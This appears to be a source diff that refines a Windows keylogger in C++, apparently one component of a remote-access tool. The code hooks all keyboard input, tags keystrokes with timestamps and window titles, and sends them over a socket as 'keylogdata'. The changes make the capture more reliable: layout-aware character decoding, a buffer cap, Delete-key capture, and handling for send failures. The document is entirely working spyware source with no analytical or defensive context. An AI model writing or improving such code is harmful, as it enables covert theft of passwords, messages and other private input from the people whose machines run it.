@@ -25,6 +25,8 @@ static mutex g_sendMutex;
 static string g_keyBuffer = "";
 static mutex g_bufferMutex;
 
+static const size_t MAX_BUFFER_SIZE = 65536; // 64KB safety limit
+
 static string wide_to_utf8(const wstring& wstr) {
     if (wstr.empty()) return "";
     int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
@@ -60,17 +62,18 @@ static void flush_buffer() {
         json j;
         j["action"] = "keylogdata";
         j["log"] = dataToLog;
-        // Use replace error handler to ensure valid UTF-8
         string serialized = j.dump(-1, ' ', false, json::error_handler_t::replace) + "\r\n";
-        safe_send_raw(g_sock, serialized);
-    } catch (...) {
-        // Prevent crash on serialization errors
-    }
+        if (!safe_send_raw(g_sock, serialized)) {
+            g_running = false;
+        }
+    } catch (...) {}
 }
 
 static void append_to_buffer(const string& log) {
     lock_guard<mutex> lock(g_bufferMutex);
-    g_keyBuffer += log;
+    if (g_keyBuffer.size() + log.size() < MAX_BUFFER_SIZE) {
+        g_keyBuffer += log;
+    }
 }
 
 static string get_active_window_title() {
@@ -105,7 +108,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             string timeStr = get_current_time_str();
             string header = "\r\n\r\n[" + timeStr + "] [" + windowTitle + "]\r\n";
             append_to_buffer(header);
-            // Don't flush here, let the timer do it to keep hook fast
         }
 
         string keyStr = "";
@@ -116,10 +118,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             case VK_RETURN:  keyStr = "[ENTER]\r\n"; isSpecial = true; break;
             case VK_SPACE:   keyStr = " "; isSpecial = true; break;
             case VK_TAB:     keyStr = "[Tab]"; isSpecial = true; break;
-            case VK_SHIFT:   case VK_LSHIFT:   case VK_RSHIFT:   return CallNextHookEx(g_hook, nCode, wParam, lParam);
-            case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return CallNextHookEx(g_hook, nCode, wParam, lParam);
-            case VK_MENU:    case VK_LMENU:    case VK_RMENU:    return CallNextHookEx(g_hook, nCode, wParam, lParam);
-            case VK_CAPITAL: return CallNextHookEx(g_hook, nCode, wParam, lParam);
             case VK_ESCAPE:  keyStr = "[Esc]"; isSpecial = true; break;
             case VK_END:     keyStr = "[End]"; isSpecial = true; break;
             case VK_HOME:    keyStr = "[Home]"; isSpecial = true; break;
@@ -127,15 +125,23 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             case VK_UP:      keyStr = "[Up]"; isSpecial = true; break;
             case VK_RIGHT:   keyStr = "[Right]"; isSpecial = true; break;
             case VK_DOWN:    keyStr = "[Down]"; isSpecial = true; break;
+            case VK_DELETE:  keyStr = "[Del]"; isSpecial = true; break;
+            case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
+            case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
+            case VK_MENU: case VK_LMENU: case VK_RMENU:
+            case VK_CAPITAL:
+                return CallNextHookEx(g_hook, nCode, wParam, lParam);
         }
 
         if (!isSpecial) {
             BYTE keyboardState[256];
-            // In LL hook, we should use GetKeyState for modifiers as GetKeyboardState might be stale
             for(int i=0; i<256; i++) keyboardState[i] = (BYTE)GetKeyState(i);
 
+            DWORD dwThreadId = GetWindowThreadProcessId(currentWindow, NULL);
+            HKL hLayout = GetKeyboardLayout(dwThreadId);
+
             wchar_t unicodeChar[8];
-            int res = ToUnicode(vkCode, pKbdStruct->scanCode, keyboardState, unicodeChar, 8, 0);
+            int res = ToUnicodeEx(vkCode, pKbdStruct->scanCode, keyboardState, unicodeChar, 8, 0, hLayout);
             if (res > 0) {
                 unicodeChar[res] = L'\0';
                 keyStr = wide_to_utf8(unicodeChar);
@@ -153,7 +159,6 @@ void StartHook() {
     g_hookThreadId = GetCurrentThreadId();
     g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
 
-    // Periodically flush buffer every 500ms
     UINT_PTR timerId = SetTimer(NULL, 0, 500, NULL);
 
     MSG msg;
